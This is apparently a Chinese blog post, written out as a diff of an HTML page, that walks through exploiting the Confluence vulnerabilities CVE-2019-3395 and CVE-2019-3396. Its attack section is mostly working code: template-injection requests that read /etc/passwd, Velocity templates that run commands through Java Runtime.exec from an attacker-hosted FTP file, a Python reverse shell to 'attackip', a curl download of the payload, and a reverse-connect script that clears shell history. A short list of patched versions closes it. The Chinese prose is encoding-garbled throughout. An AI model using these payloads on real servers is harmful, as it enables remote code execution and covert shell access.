@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="zhaijiahui">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="zhaijiahui">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Confluence-CVE20193396 · 时光不改&#39;s 记忆碎片</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/dabai_favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >时光不改&#39;s 记忆碎片</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Confluence-CVE20193396</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>时光不改's 记忆碎片</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Confluence-CVE20193396
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Confluence">Confluence</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/06/06</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Confluence-SSRF��Զ�̴���ִ��©����CVE-2019-3395-CVE-2019-3396"><a href="#Confluence-SSRF��Զ�̴���ִ��©����CVE-2019-3395-CVE-2019-3396" class="headerlink" title="Confluence SSRF��Զ�̴���ִ��©����CVE-2019-3395\CVE-2019-3396)"></a>Confluence SSRF��Զ�̴���ִ��©����CVE-2019-3395\CVE-2019-3396)</h1><h2 id="©������"><a href="#©������" class="headerlink" title="©������"></a>©������</h2><p>���գ�Confluence�ٷ�������SSRF©����CVE-2019-3395����Զ�̴���ִ��©����CVE-2019-3396���İ�ȫͨ�棬����������©����ʵ��Զ�̴���ִ�С�������������α�졣�˴�ͨ���©���ֱ������WebDAV����Widget�������С�</p>
+<h2 id="CVE-2019-3395-WebDAV"><a href="#CVE-2019-3395-WebDAV" class="headerlink" title="CVE-2019-3395 WebDAV"></a>CVE-2019-3395 WebDAV</h2><p>2018��6��18��ǰ������Confluence Server��Data Center���ܴ�©��Ӱ�졣��©��������WebDAV����У������߿�Զ�����ô�©��ʹConfluence��������Data Center��������HTTP��WebDAV����ʵ�ַ�����������α�죨SSRF����</p>
+<p>�ٷ�����Դ�©������6.8.5��6.9.3�޸��汾��</p>
+<h2 id="CVE-2019-3396-Widget-Connector"><a href="#CVE-2019-3396-Widget-Connector" class="headerlink" title="CVE-2019-3396 Widget Connector"></a>CVE-2019-3396 Widget Connector</h2><p>��©��Ϊserver-side template injection��������ģ��ע��©����������Confluence Server��Data Center��Widget Connector����С������߳ɹ����ô�©����ʵ��Ŀ¼��Խ��Զ�̴���ִ�С�</p>
+<p>�ٷ�����Դ�©������6.12.3��6.13.3��6.14.2�޸��汾��</p>
+<h2 id="©������-1"><a href="#©������-1" class="headerlink" title="©������"></a>©������</h2><h3 id="1-�l�����"><a href="#1-�l�����" class="headerlink" title="1.�ļ�����"></a>1.�ļ�����</h3><p>ʹ�����±��ģ�ȥ���ʼ���<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Connection: close</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://ip:port/login.action?os_destination=/index.action&amp;permissionViolation=true</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Length: 181</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;65601&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:////etc//passwd&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/06/06/Confluence_CVE20193396/./Confluence_CVE20193396/passwd.png" alt=""></p>
+<h3 id="2-��ȡ��j�u���·��"><a href="#2-��ȡ��j�u���·��" class="headerlink" title="2.��ȡ��ǰ�û���·��"></a>2.��ȡ��ǰ�û���·��</h3><p>1.�½�vm�ļ�<br>��������:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;,$e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;user.name&apos;).toString()</span><br><span class="line">$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;,$e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;user.dir&apos;).toString()</span><br></pre></td></tr></table></figure>
+<p>2.�ϴ�vm�ļ�<br>��vm�ļ��ϴ���ĳ̨�����������䴦��ftpЭ�����httpsЭ����</p>
+<p>3.�޸ı���<br>�������е�<code>_template</code>������ֵ�޸�Ϊ��vm�ļ���url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Connection: close</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://ip:port/login.action?os_destination=/index.action&amp;permissionViolation=true</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Length: 181</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;65601&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;ftp://ip:port/os.vm&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/06/Confluence_CVE20193396/./Confluence_CVE20193396/pwd.png" alt=""></p>
+<h3 id="3-����ִ��"><a href="#3-����ִ��" class="headerlink" title="3.����ִ��"></a>3.����ִ��</h3><p>1.�½�vm�ļ�<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($e=&quot;exp&quot;)</span><br><span class="line">#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure></p>
+<p>2.�޸ı���<br>������������һ�����������ӵĲ�����Ҫ��vm�ļ��еڶ���exec��ֵ��Ӧ</p>
+<p>�����޸����£�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host:ip:port</span><br><span class="line">Connection: close</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://ip:port/login.action?os_destination=/index.action&amp;permissionViolation=true</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;12345&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;http://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;ftp://ip:port/rce.vm&quot;,&quot;cmd&quot;:&quot;ls&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/06/Confluence_CVE20193396/./Confluence_CVE20193396/rce.png" alt=""></p>
+<p>3.��������ִ��<br>ֻ��Ҫ���������Java RunTimeת��</p>
+<p><img src="/2019/06/06/Confluence_CVE20193396/./Confluence_CVE20193396/java_runtime.png" alt=""><br>ת�����ӣ�<a href="http://www.jackson-t.ca/runtime-exec-payloads.html(��������jas502n)" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html(��������jas502n)</a></p>
+<h3 id="4-����shell"><a href="#4-����shell" class="headerlink" title="4.����shell"></a>4.����shell</h3><p>����shell�����кܶ࣬�������ֱ�ӷ���shell����Ч�����ڴ󲿷�Confluence��ʹ�ü��ɻ��ļ���װ��<br>�������õĻ����û���Ϊconfluence,Ȩ�޺ܵ͡�</p>
+<p>������confluence�û���ֱ�ӽ��д����ϴ�Ҳ�������ļ���д��·��Ȩ�޵����⡣(˼·Դ�����)�󲿷�confluenceĬ�ϵ�ǰ·��Ϊ /opt/atlassian/confluence/bin (pwd)</p>
+<p>ʹ��ls -l������в鿴����дȨ�ޡ�<br>���Կ�����ǰĿ¼������Ч�ļ��С�������ת����һ�� ls -l ../��</p>
+<p>���Է���work��temp��logsĿ¼��Ϊconfluence��root�û������Է��ʵ�Ŀ¼��<br>���ˣ��ϴ������ű�������һ��Ŀ¼���ɡ�������tempĿ¼��python����shellΪ����<br>����������Եķ�����ο���<br><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"attackip"</span>,attackport));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>���ű��е�attackip��attackport��Ϊvps��ip��port������vps��ʹ��������������˿�<br><code>nc -l -p port -vvv</code></p>
+<p>�������ű��ļ��ϴ���ĳ̨vps�ϣ����䴦��ftpЭ�����httpsЭ���£����Է��ʼ��ɡ�ʹ��������������nc.py����������Ժ󣬲����л���(����Ѿ�����/opt/atlassian/confluence/Ŀ¼�£��������../)<br><code>curl -o ../temp/nc.py https://ip:port/nc.py</code></p>
+<p>ʹ�����������nc.pyִ��Ȩ��</p>
+<p><code>chmod a+x ../temp/nc.py</code></p>
+<p>�������Ժ󣬼ǵü��һ��Ȩ�ޣ���x�ͺ�</p>
+<p>ʹ������������з���</p>
+<p><code>python ../temp/nc.py #(�����nc.py�ļ�λ�ý��е���)</code><br>���Կ����Ѿ������ɹ�</p>
+<h3 id="5-����"><a href="#5-����" class="headerlink" title="5.����"></a>5.����</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#����ʹ������python�ű����ж�̬ip����(��������jas502n)</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">back connect py version,only linux have pty module</span></span><br><span class="line"><span class="string">code by google security team</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys,os,socket,pty</span><br><span class="line">shell = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'python reverse connector'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'usage: %s &lt;ip_addr&gt; &lt;port&gt;'</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>])))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'connect ok'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'connect faild'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">global</span> shell</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>ʹ������������з���<br><code>python ../temp/nc.py attackip attackport</code></p>
+<h1 id="�޸�����"><a href="#�޸�����" class="headerlink" title="�޸�����"></a>�޸�����</h1><p>�ٷ�����<br>�ٷ������û����������°汾6.15.1���Ա�֤����İ�ȫ�Լ��ȶ��ԡ������������£�</p>
+<p><a href="https://www.atlassian.com/software/confluence/download/" target="_blank" rel="noopener">https://www.atlassian.com/software/confluence/download/</a><br><a href="https://atlassian.com/software/confluence/download/data-center" target="_blank" rel="noopener">https://atlassian.com/software/confluence/download/data-center</a></p>
+<p>���޷����������°汾���ɲο��±�����������Ӧ�޸��汾��</p>
+<table>
+<thead>
+<tr>
+<th>��ǰ�汾</th>
+<th>�޸��汾</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>6.12.0, 6.12.1, 6.12.2</td>
+<td>6.12.3</td>
+</tr>
+<tr>
+<td>6.14.0, 6.14.1</td>
+<td>6.14.2</td>
+</tr>
+<tr>
+<td>6.6.0, 6.6.1, 6.6.2, 6.6.3, 6.6.4, 6.6.5, 6.6.6, 6.6.7, 6.6.8, 6.6.9, 6.6.10, 6.6.11</td>
+<td>6.6.12</td>
+</tr>
+<tr>
+<td>6.13.0, 6.13.1, 6.13.2</td>
+<td>6.13.3</td>
+</tr>
+</tbody>
+</table>
+<p>�������ڰ汾    ��������6.14.2��6.13.3��6.6.12��һ�汾��<br><strong>����widgetconnector������޸��汾</strong><br>�û���ͨ���滻widgetconnector-*.jar�ļ����޸���widgetconnector-3.1.4����ʵ�ֶ�©��CVE-2019-3396���޸�����������������£�</p>
+<p>�ҵ����widgetconnector-<em>.jar�ļ�����λ�ã�linuxϵͳ�¿�ͨ������������ң�<br>`find / -name ��widgetconnector-</em>��`</p>
